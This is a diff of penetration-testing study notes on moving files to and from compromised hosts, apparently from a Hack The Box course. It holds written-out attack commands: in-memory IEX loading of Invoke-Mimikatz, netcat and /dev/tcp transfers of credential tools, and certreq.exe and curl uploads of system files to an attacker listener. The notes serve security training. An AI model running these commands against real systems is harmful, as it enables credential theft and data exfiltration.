@@ -29,8 +29,9 @@
     - [File Encryption on Windows](#file-encryption-on-windows)
     - [File Encryption on Linux](#file-encryption-on-linux)
 - [Catching Files over HTTP/S](#catching-files-over-https)
-
-
+- [Living off The Land](#living-off-the-land)
+    - [LOLBAS](#lolbas)
+    - [GTFOBins](#gtfobins)
 
 
 ## Windows File Transfer Methods
@@ -64,7 +65,7 @@
 |DownloadString|	Downloads a String from a resource and returns a String.|
 |DownloadStringAsync|	Downloads a String from a resource without blocking the calling thread.|
 
-##### PowerShell DownloadFile Method
+##### PowerShell Download File Method
 1. First Approach
     - File Download
     ```powershell
@@ -79,23 +80,26 @@
 
     - PowerShell DownloadString - Fileless Method
         - PowerShell can be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.
-    ```powershell
+```powershell
     PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
 
-    ```
+```
 
 > [!NOTE] IEX also accepts pipeline input. 
 
-    ```powershell
+
+```powershell
     PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
-    ```
+```
 
 3. Third Approach
 
     - From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available.
-    ```powershell
+
+```powershell
     PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
-    ```
+```
+
 ##### Common Errors with PowerShell
 1. There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter `-UseBasicParsing`
 ```powershell
@@ -127,7 +131,7 @@ PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback
 
 - We need to create an SMB server in our Pwnbox with [smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py) from Impacket and then use `copy`, `move`, PowerShell `Copy-Item`, or any other tool that allows connection to SMB.
 - **Steps**
-    1. Create the SMB Server `sudo impacket-smbserver -smb2support CompData /tmp`
+    1. Create the SMB Server `sudo impacket-smbserver share -smb2support /tmp/smbshare`
     2. Copy a File from the SMB Server `C:\htb> copy \\ATTACKING_BOX\share\nc.exe`
 
 - New versions of Windows block unauthenticated guest access, as we can see in the following command: 
@@ -403,23 +407,23 @@ You can't access this shared folder because your organization's security policie
 - The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target.
 - **Steps**
     1. We'll first start Netcat (nc) on the compromised machine, listening with option -l, selecting the port to listen with the option -p 8000, and redirect the stdout using a single greater-than > followed by the filename:
-    ```bash
+```bash
 
     victim@target:~$ # Example using Original Netcat
     victim@target:~$ nc -l -p 8000 > SharpKatz.exe
 
     victim@target:~$ # Example using Ncat
     victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
-    ```
+```
 
     2. From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file SharpKatz.exe as input to Netcat.
-    ```bash
+```bash
     abdeonix@htb[/htb]$ # Example using Original Netcat
     abdeonix@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
 
     abdeonix@htb[/htb]$ # Example using Ncat
     abdeonix@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
-    ```
+```
 
 > [!NOTE]
 > Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections.
@@ -454,7 +458,7 @@ You can't access this shared folder because your organization's security policie
 > # Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File
 > victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
 > ```
-> Note: The same operation can be used to transfer files from the compromised host to our Pwnbox.
+> [!NOTE] The same operation can be used to transfer files from the compromised host to our Pwnbox.
 
 ### PowerShell Session File Transfer
 - We already talk about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use PowerShell Remoting, aka WinRM, to perform file transfer operations.
@@ -668,4 +672,99 @@ abdeonix@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -
 ```
 
 ## Catching Files over HTTP/S
-### Nginx - Enabling PUT
+### Nginx - File Upload Operation
+
+```bash
+# Create a Directory to Handle Uploaded Files
+abdeonix@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory
+
+# Change the Owner to www-data
+abdeonix@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
+
+# Create Nginx Configuration File (/etc/nginx/sites-available/upload.conf)
+# server {
+#     listen 9001;
+    
+#     location /SecretUploadDirectory/ {
+#         root    /var/www/uploads;
+#         dav_methods PUT;
+#     }
+# }
+
+# Symlink our Site to the sites-enabled Directory
+abdeonix@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+
+# Start Nginx
+sudo systemctl restart nginx.service
+
+# Verifying Errors
+abdeonix@htb[/htb]$ tail -2 /var/log/nginx/error.log
+
+# If port 80 is already in use 
+# Remove NginxDefault Configuration
+abdeonix@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default
+
+# Upload File Using cURL
+abdeonix@htb[/htb]$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
+
+```
+
+
+
+## Living off The Land
+- LOLBins websites:
+    - [Windows binaries](https://lolbas-project.github.io/)
+    - [Linux binaries](https://gtfobins.github.io/)
+
+
+### LOLBAS
+- To search for download and upload functions in LOLBAS we can use /download or /upload.
+- Example: CertReq.exe
+```cmd
+# Upload win.ini to our Pwnbox
+C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
+```
+- File Received in our Netcat Session
+```bash
+abdeonix@htb[/htb]$ sudo nc -lvnp 8000
+
+listening on [any] 8000 ...
+connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819
+POST / HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Pragma: no-cache
+Content-Type: application/json
+User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
+Content-Length: 92
+Host: 192.168.49.128:8000
+
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+```
+- If you have issues with CertReq.exe, Install the [latest version](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) and try again
+
+### GTFOBins
+- To search for the download and upload function in GTFOBins, we can use +file download or +file upload.
+- Example: openssl
+```bash
+# Our pwn box
+abdeonix@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+abdeonix@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+
+# Download the file from the compromised machine
+abdeonix@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
+```
+
+
+### Other Common Living off the Land tools
+- Bitsadmin Download function
+- Certutil
+
+
+## Detection
